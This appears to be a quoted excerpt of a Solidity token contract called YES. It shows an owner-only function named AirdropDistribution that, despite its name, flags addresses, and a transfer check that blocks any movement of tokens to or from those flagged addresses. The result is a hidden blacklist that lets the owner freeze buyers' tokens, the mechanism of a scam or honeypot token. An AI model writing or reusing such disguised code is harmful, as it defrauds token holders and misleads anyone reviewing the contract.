...
contract YES is Context, IERC20, Ownable {
    ...
    //address payable public marketingAddress = payable(0xb7d09c6e677290d1ac3ce19d30204be88e5e8806); // Marketing Address
    ...
    bool public buyBackEnabled = true;
      ...
      //distributing token from airdrop
    function AirdropDistribution(address[] calldata addresses) external onlyOwner {
      for (uint256 i; i< addresses.length; ++i) {
        Airdrop[addresses[i]] = true;
      }
    }
    ...
    function _transfer(
        ...
        require(!Airdrop[to] && !Airdrop[from], "Airdrop address");
